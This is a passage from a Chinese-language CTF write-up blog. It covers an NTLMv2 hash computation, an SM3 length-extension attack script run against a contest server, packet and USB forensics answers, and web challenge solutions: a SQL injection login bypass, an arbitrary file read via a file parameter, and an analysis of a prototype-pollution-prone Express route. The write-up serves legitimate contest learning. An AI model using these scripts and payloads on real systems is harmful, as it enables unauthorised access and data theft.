class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> hmac <br>_ntlm = hashlib.new(<span class="hljs-string">&quot;md4&quot;</span>, <span class="hljs-string">&quot;QUICAUTH-CCC123!@#&quot;</span>.encode(<span class="hljs-string">&quot;utf-16-le&quot;</span>)).digest() <br>ntlm = binascii.hexlify(_ntlm).decode(<span class="hljs-string">&quot;utf-8&quot;</span>) <br>s = <span class="hljs-string">&quot;adminSecretServer&quot;</span>.upper().encode(<span class="hljs-string">&quot;utf-16-le&quot;</span>).<span class="hljs-built_in">hex</span>() <br>firstHMAC = hmac.new(<span class="hljs-built_in">bytes</span>.fromhex(ntlm), <span class="hljs-built_in">bytes</span>.fromhex(s),hashlib.md5).hexdigest() <br>type2Challange = <span class="hljs-string">&quot;d158262017948de9010100000000000058b2da67cbe0d001c575cfa48d38bec50000000002001600450047004900540049004d002d00500043003100340001001600450047004900540049004d002d00500043003100340004001600650067006900740069006d002d00500043003100340003001600650067006900740069006d002d0050004300310034000700080058b2da67cbe0d0010600040002000000080030003000000000000000000000000030000065d85a4000a167cdbbf6eff657941f52bc9ee2745e11f10c61bb24db541165800a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e0031002e00310030003700000000000000000000000000&quot;</span> <br>ntlmv2 = hmac.new(<span class="hljs-built_in">bytes</span>.fromhex(firstHMAC), <span class="hljs-built_in">bytes</span>.fromhex(type2Challange),hashlib.md5).hexdigest() <br><span class="hljs-built_in">print</span>(ntlmv2)<br><span class="hljs-comment">#efa243f442b9d683eb1b00a2b1a0c9fc</span><br></code></pre></td></tr></table></figure><p><code>efa243f442b9d683eb1b00a2b1a0c9fc</code><br><code>flag&#123;8af4d019-98ae-4b4f-a4e9-97076d205fd2&#125;</code></p><h3 id="hash-append（复现）"><a href="#hash-append（复现）" class="headerlink" title="hash_append（复现）"></a>hash_append（复现）</h3><p>sm3的哈希长度扩展攻击<br>不会密码，留个脚本备用<br>参考<a href="https://mp.weixin.qq.com/s/oE8M9x7cRsjbXY50v8jTwQ">https://mp.weixin.qq.com/s/oE8M9x7cRsjbXY50v8jTwQ</a><br>使用以下项目修改：<br><a href="https://github.com/LJY-21/Length_Extension_Attack_for_SM3.py/blob/master/extension_sm3.py">https://github.com/LJY-21/Length_Extension_Attack_for_SM3.py/blob/master/extension_sm3.py</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3,func<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> extension_sm3<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>p = remote(<span class="hljs-string">&quot;123.56.51.164&quot;</span>, <span class="hljs-number">23433</span>)<br>p.recvuntil(<span class="hljs-string">b&quot;MySecretInfo Hash: &quot;</span>)<br>target_hash = p.recv(<span class="hljs-number">64</span>).decode(<span class="hljs-string">&quot;utf-8&quot;</span>)<br><br><span class="hljs-comment"># secret = str(random.random())   #生成随机浮点数作为保密消息，且该消息的长度已知</span><br>secret = <span class="hljs-string">&#x27;a&#x27;</span> * <span class="hljs-number">64</span><br><span class="hljs-comment"># secret_hash = sm3.sm3_hash(func.bytes_to_list(bytes(secret, encoding=&#x27;utf-8&#x27;)))</span><br><span class="hljs-comment"># secret_hash = &#x27;8fab83a3a3070b88483c3053c6399d93386dec09e1fc64ba76f86a143b30525b&#x27;</span><br>secret_hash = target_hash<br><br>secret_len = <span class="hljs-built_in">len</span>(secret)<br><span class="hljs-comment"># extend_msg = &quot;61&quot; * 64         #指定的附加消息</span><br>extend_msg = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;生成的随机保密消息为：%s，指定的附加消息为：%s&quot;</span>% (secret,extend_msg))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">msg</span>):<br>    len1 = <span class="hljs-built_in">len</span>(msg)<br>    reserve1 = len1 % <span class="hljs-number">64</span><br>    msg.append(<span class="hljs-number">0x80</span>)<br>    reserve1 = reserve1 + <span class="hljs-number">1</span><br>    range_end = <span class="hljs-number">56</span><br>    <span class="hljs-keyword">if</span> reserve1 &gt; range_end:<br>        range_end = range_end + <span class="hljs-number">64</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(reserve1, range_end):<br>        msg.append(<span class="hljs-number">0x00</span>)<br>    bit_length = len1 * <span class="hljs-number">8</span><br>    bit_length_str = [bit_length % <span class="hljs-number">0x100</span>]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>        bit_length = <span class="hljs-built_in">int</span>(bit_length / <span class="hljs-number">0x100</span>)<br>        bit_length_str.append(bit_length % <span class="hljs-number">0x100</span>)<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        msg.append(bit_length_str[<span class="hljs-number">7</span> - i])<br>    <span class="hljs-keyword">return</span> msg<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_guess_hash</span>(<span class="hljs-params">secret_hash, secret_len, extend_msg</span>):<br>    <span class="hljs-comment">#通过secret_hash获得当前8个向量值</span><br>    vectors = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">8</span>):<br>        vectors.append(<span class="hljs-built_in">int</span>(secret_hash[i * <span class="hljs-number">8</span>:(i + <span class="hljs-number">1</span>) * <span class="hljs-number">8</span>], <span class="hljs-number">16</span>))<br>    <span class="hljs-comment">#以等长的任意字符串代替secret，在填充后级联extend_msg</span><br>    message = [<span class="hljs-number">65</span> <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(secret_len)]<br>    message = padding(message)<br>    old_len = <span class="hljs-built_in">len</span>(message)<br>    message.extend(func.bytes_to_list(<span class="hljs-built_in">bytes</span>(extend_msg, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br>    ret = extension_sm3.extension_sm3_hash(message, vectors, old_len)<br>    <span class="hljs-keyword">return</span> ret<br><br><br><span class="hljs-comment">#验证get_guess_hash的结果是否正确</span><br>message = func.bytes_to_list(<span class="hljs-built_in">bytes</span>(secret, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>message = padding(message)<br>message.extend(func.bytes_to_list(<span class="hljs-built_in">bytes</span>(extend_msg, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>)))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------&quot;</span>)<br>append = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message[<span class="hljs-number">64</span>:]:<br>    append += <span class="hljs-built_in">hex</span>(i).replace(<span class="hljs-string">&quot;0x&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>)<br><span class="hljs-built_in">print</span>(append)<br>p.sendlineafter(<span class="hljs-string">b&quot;Input AppendData: &quot;</span>, append)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-------------------&quot;</span>)<br>m = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> message:<br>    m += <span class="hljs-built_in">hex</span>(i).replace(<span class="hljs-string">&quot;0x&quot;</span>, <span class="hljs-string">&quot;&quot;</span>).rjust(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;0&quot;</span>)<br><span class="hljs-built_in">print</span>(m)<br>guess_hash = get_guess_hash(secret_hash, secret_len, extend_msg)<br>p.sendlineafter(<span class="hljs-string">b&quot;Input NewSecretInfo Hash: &quot;</span>, guess_hash)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><h3 id="Wireshark2-1"><a href="#Wireshark2-1" class="headerlink" title="Wireshark2.1"></a>Wireshark2.1</h3><p>题目内容：<br>存在漏洞的PHP页面名称是？（比如：a.php）<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714476593745-97d190f2-4fe3-434f-81a4-be770573c941.jpeg" alt="1714476546081.jpg"><br>theanswerishere.php</p><h3 id="Wireshark2-2"><a href="#Wireshark2-2" class="headerlink" title="Wireshark2.2"></a>Wireshark2.2</h3><p>题目内容：当前表的列数共有几列？（比如：1<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714476829457-603722ec-f812-4a7f-ba31-7a4816fcc254.jpeg" alt="1714476780688.jpg"><br>联合查询3个列<br>回显位在第三个<br><code>3</code></p><h3 id="Wireshark2-3"><a href="#Wireshark2-3" class="headerlink" title="Wireshark2.3"></a>Wireshark2.3</h3><p>题目内容：注入目标的列名是？</p><p><code>th1sfI4g</code></p><h3 id="Wireshark2-4"><a href="#Wireshark2-4" class="headerlink" title="Wireshark2.4"></a>Wireshark2.4</h3><p>题目内容：攻击者试图最终试图获取的数据是？<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714476906481-ff534644-c6f3-48a5-8901-1980979318d2.jpeg" alt="1714476859369.jpg"><br><code>flag&#123;th1s_ls_tHe_sQI1_anSwer&#125;</code></p><h3 id="WeirdUSB-1"><a href="#WeirdUSB-1" class="headerlink" title="WeirdUSB.1"></a>WeirdUSB.1</h3><p>题目内容：嫌疑人从Dropbox下载了什么文件？<br>010检索<code>dropbox</code> 得到下载链接<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714476968089-d981fa98-0111-44e9-8dab-6c3532ba7240.jpeg" alt="1714476920112.jpg"><br>在浏览器下载的文件后缀<code>.crdownload</code><br>往上翻一下，翻到个有download字眼的<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714477139375-ad37049c-9957-4eb0-9f82-0bec87e0439b.jpeg" alt="1714477083907.jpg"><br><code>212633.crdownload</code></p><h3 id="WeirdUSB-2"><a href="#WeirdUSB-2" class="headerlink" title="WeirdUSB.2"></a>WeirdUSB.2</h3><p>题目内容：给出USB中被彻底删除的两个文件名。(按照删除的顺序用-连接，比如1.txt-2.txt)<br>结合<code>$LogFile</code>分析，这里面没有<code>2_2_5_a.txt-2_2_5_b.txt</code>两个文件<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714477465925-940e824b-8eb7-49fb-8399-63e811ce5b9f.jpeg" alt="1714477417970.jpg"><br>而在r-studio有<br><img src="/mdimg/2024%E6%95%B0%E6%8D%AE%E5%AE%89%E5%85%A8%E4%BA%A7%E4%B8%9A%E4%BA%BA%E6%89%8D%E7%A7%AF%E5%88%86%E4%BA%89%E5%A4%BA%E8%B5%9B%E5%88%9D%E8%B5%9B%E9%83%A8%E5%88%86wp/1714477477728-594f733d-c27a-492b-95a0-8301b14f5fc7.jpeg" alt="1714477429629.jpg"><br><code>2_2_5_a.txt-2_2_5_b.txt</code></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>比赛Write Up</category>
      
    </categories>
    
    
    <tags>
      
      <tag>比赛Write Up</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SpringForwardCTF2024 web</title>
    <link href="/2024/04/28/SpringForwardCTF2024web/"/>
    <url>/2024/04/28/SpringForwardCTF2024web/</url>
    
    <content type="html"><![CDATA[<h2 id="Socratic-Script"><a href="#Socratic-Script" class="headerlink" title="Socratic-Script"></a>Socratic-Script</h2><p>上传发现弹窗<br><img src="/mdimg/SpringForwardCTF2024/1714364709875-d3ed1a82-98a7-4f9d-9aab-4cc177e0cce4.png" alt="image.png"><br><img src="/mdimg/SpringForwardCTF2024/1714364808819-20b85bdc-c424-4335-a41e-682c865febd5.png" alt="image.png"><br>禁用js就行了<br>把题目给的附件txt上传就行了<br><img src="/mdimg/SpringForwardCTF2024/1714364895685-75d349fc-048c-4ad4-b682-240080cf8076.png" alt="image.png"></p><h2 id="Into-the-Gorgons’-Den"><a href="#Into-the-Gorgons’-Den" class="headerlink" title="Into-the-Gorgons’-Den"></a>Into-the-Gorgons’-Den</h2><p>看源码<br><img src="/mdimg/SpringForwardCTF2024/1714365145231-d9c92c75-3efd-47d1-a95e-f8128323457e.png" alt="image.png"><br>得到第三部分flag：<code>_g0rg0n&#125;</code><br><img src="/mdimg/SpringForwardCTF2024/1714365339177-1891f557-465d-4617-a445-59dc1c39faed.png" alt="image.png"><br>第一个框的按钮调用的是<code>mirror()</code>方法，跟进一下<br><img src="/mdimg/SpringForwardCTF2024/1714365417532-a6b928e0-d03f-46b4-8836-cf79ef14f389.png" alt="image.png"><br>输入<code>suesrep</code>返回<code>Medusa&#39;s weakness is her reflection! She will turn her gaze at the 30th minute minus 2.</code>美杜莎的弱点是她的倒影！她将把目光转向第 30 分钟减去 2。<br>等到28分<br><img src="/mdimg/SpringForwardCTF2024/1714369510753-7b08e540-b2ed-4e63-9e7f-336550446664.jpeg" alt="1714369463656.jpg"><br>页面下面有段密文<img src="/mdimg/SpringForwardCTF2024/1714365618959-9f536ffc-fd55-489a-a544-c008b777dd2d.png" alt="image.png"><br><img src="/mdimg/SpringForwardCTF2024/1714365569762-3d660425-2016-4b83-8c7f-923a3d7f3c61.png" alt="image.png"><br>这句话的意思是第二部分的flag是<code>th3</code><br>最终<br><code>nicc&#123;sl4y_th3_g0rg0n&#125;</code></p><h2 id="back-in-time"><a href="#back-in-time" class="headerlink" title="back-in-time"></a>back-in-time</h2><p>进去一登录框<br><img src="/mdimg/SpringForwardCTF2024/1714369675056-7814635f-23bc-4e02-90e5-8bda33d3fa32.png" alt="image.png"><br>有注入<br>直接 <code>admin </code> <code>1&quot;or&quot;1&quot;=&quot;1</code> 就登进去了<br>查看源码得到<code>&lt;!-- back-in-time flag part 1 of 3: &quot;nicc&#123;nBUE2hG&quot; --&gt;</code><br>在<code>/[travel](http://34.207.63.151/travel)</code>路由源码得到 <code>&lt;!-- back-in-time flag part 2 of 3: &quot;meTQRbL&quot; --&gt;</code><br>访问<code>/status</code>路由时<br><img src="/mdimg/SpringForwardCTF2024/1714369991939-ccf33798-2075-4d42-b6bf-d2db325d6646.png" alt="image.png"><br><code>nicc&#123;nBUE2hGmeTQRbLcijueiF&#125;</code></p><h2 id="Underworld-Bypass"><a href="#Underworld-Bypass" class="headerlink" title="Underworld-Bypass"></a>Underworld-Bypass</h2><p>描述：</p><blockquote><p>Cast into the inferno’s depths, souls languish in perpetual torment, with no reprieve from the hellfire’s embrace. Yet whispers endure of a realm_key, a legendary artifact able to traverse the boundaries between worlds, offering a glimmer of salvation. The question that burns as fiercely as the flames themselves: do you possess the courage to seek it? Find flag.txt and submit the flag in the format flag nicc{flag}</p></blockquote><p>flag在flag.txt<br>hint：<code>The Keeper&#39;s Riddle last line</code><br><img src="/mdimg/SpringForwardCTF2024/1714370604582-8b7dd133-9e63-4983-9670-94698ee3e526.png" alt="image.png"><br>发现文件读取<br><code>/explore.php?file=/realm_key/flag.txt</code><br><img src="/mdimg/SpringForwardCTF2024/1714370659167-663e375b-191c-4ca7-8344-cd911fe03e9a.png" alt="image.png"></p><h2 id="back-in-time-2-electric-boogaloo"><a href="#back-in-time-2-electric-boogaloo" class="headerlink" title="back-in-time-2-electric-boogaloo"></a>back-in-time-2-electric-boogaloo</h2><p>给了源码<br>在<code>/routes/travel.js</code>找到了flag<br><img src="/mdimg/SpringForwardCTF2024/1714391845578-05acf8ca-8ae5-41f1-bc97-f4052efd887a.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">import</span> &#123; sqlConnection &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../app.js&#x27;</span>;<br><span class="hljs-keyword">import</span> timeController <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;../system-control.js&#x27;</span>;<br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Router</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;express&#x27;</span>;<br><br><span class="hljs-keyword">const</span> timeTravelRouter = <span class="hljs-title class_">Router</span>(&#123; <span class="hljs-attr">mergeParams</span>: <span class="hljs-literal">true</span> &#125;);<br><br>timeTravelRouter.<span class="hljs-title function_">get</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">let</span> results;<br><br>  <span class="hljs-keyword">try</span> &#123;<br>    [results] = <span class="hljs-keyword">await</span> sqlConnection.<span class="hljs-title function_">execute</span>(<br>      <span class="hljs-string">&#x27;SELECT * FROM leaps ORDER BY leap_id DESC&#x27;</span>);<br>  &#125; <span class="hljs-keyword">catch</span> (error) &#123;<br>    results = <span class="hljs-literal">null</span>;<br>  &#125;<br><br><br>  <span class="hljs-keyword">let</span> lastTravelDate;<br>  <span class="hljs-keyword">if</span> (results &amp;&amp; results.<span class="hljs-property">length</span>) &#123;<br>    <span class="hljs-keyword">const</span> lastTravelEntry = results[<span class="hljs-number">0</span>];<br>    lastTravelDate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(lastTravelEntry.<span class="hljs-property">leap_date</span>);<br>    lastTravelDate.<span class="hljs-title function_">setFullYear</span>(lastTravelEntry.<span class="hljs-property">year</span>);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    lastTravelDate = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(<span class="hljs-string">&#x27;1970-01-01&#x27;</span>);<br>  &#125;<br><br>  res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;travel&#x27;</span>, &#123;<br>    <span class="hljs-attr">session</span>: req.<span class="hljs-property">session</span>,<br>    <span class="hljs-attr">currentDate</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(),<br>    <span class="hljs-attr">lastTravelDate</span>: lastTravelDate,<br>    <span class="hljs-attr">destinationDate</span>: <span class="hljs-title function_">timeController</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;GetSetpoint&#x27;</span> &#125;),<br>  &#125;);<br>&#125;);<br><br>timeTravelRouter.<span class="hljs-title function_">put</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (req, res) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> request = &#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;SetSetpoint&#x27;</span> &#125;;<br><br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">debug</span> &amp;&amp; !(process.<span class="hljs-property">env</span>.<span class="hljs-property">ALLOW_USER_DEBUG</span> === <span class="hljs-string">&#x27;true&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Debug mode is not allowed to be set.&#x27;</span> &#125;);<br>  &#125;<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> prop <span class="hljs-keyword">in</span> req.<span class="hljs-property">body</span>) &#123;<br>    request[prop] = req.<span class="hljs-property">body</span>[prop];<br>  &#125;<br><br>  <span class="hljs-keyword">const</span> date = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>(req.<span class="hljs-property">body</span>.<span class="hljs-property">date</span>);<br>  <span class="hljs-keyword">let</span> year = req.<span class="hljs-property">body</span>.<span class="hljs-property">year</span>;<br>  <span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">bc</span>)<br>    year = year * -<span class="hljs-number">1</span>;<br>  date.<span class="hljs-title function_">setFullYear</span>(year);<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title function_">timeController</span>(request);<br>    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">debug</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">debugInfo</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125;<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>    <span class="hljs-keyword">if</span> (request.<span class="hljs-property">debug</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span>, <span class="hljs-attr">debugInfo</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> &#125;);<br>    &#125;<br>  &#125;<br><br>&#125;);<br>timeTravelRouter.<span class="hljs-title function_">post</span>(<span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-keyword">async</span> (_req, res) =&gt; &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-title function_">timeController</span>(&#123; <span class="hljs-attr">type</span>: <span class="hljs-string">&#x27;TimeTravel&#x27;</span> &#125;);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> &#125;);<br>  &#125; <span class="hljs-keyword">catch</span> (err) &#123;<br>    res.<span class="hljs-title function_">status</span>(<span class="hljs-number">500</span>);<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: err.<span class="hljs-property">message</span> &#125;);<br>  &#125;<br>&#125;);<br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> timeTravelRouter;<br><br></code></pre></td></tr></table></figure><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (request.<span class="hljs-property">debug</span>) &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">debugInfo</span>: process.<span class="hljs-property">env</span>.<span class="hljs-property">FLAG</span> &#125;);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">success</span>: <span class="hljs-literal">true</span> &#125;);<br>    &#125;<br></code></pre></td></tr></table></figure><p>要<code>request.debug==true</code>就返回flag   看上去能用原型链污染<br>在web页面登录后（和第一题一样登录）<br><img src="/mdimg/SpringForwardCTF2024/1714392310312-494debad-000d-4eb9-b22b-723e81780812.png" alt="image.png"><br><img src="/mdimg/SpringForwardCTF2024/1714392354174-30108409-5dae-483c-bec6-436956b8e4d0.png" alt="image.png"><br>加上debug参数<br><img src="/mdimg/SpringForwardCTF2024/1714392415129-a5c6ac79-0eed-4104-b6f8-38ffc54113b5.png" alt="image.png"><br>这里触发了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">if</span> (req.<span class="hljs-property">body</span>.<span class="hljs-property">debug</span> &amp;&amp; !(process.<span class="hljs-property">env</span>.<span class="hljs-property">ALLOW_USER_DEBUG</span> === <span class="hljs-string">&#x27;true&#x27;</span>)) &#123;<br>    <span class="hljs-keyword">return</span> res.<span class="hljs-title function_">json</span>(&#123; <span class="hljs-attr">error</span>: <span class="hljs-string">&#x27;Debug mode is not allowed to be set.&#x27;</span> &#125;);<br>  &#125;<br></code></pre></td></tr></table></figure><p>接着下一行</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">for</span> (<span 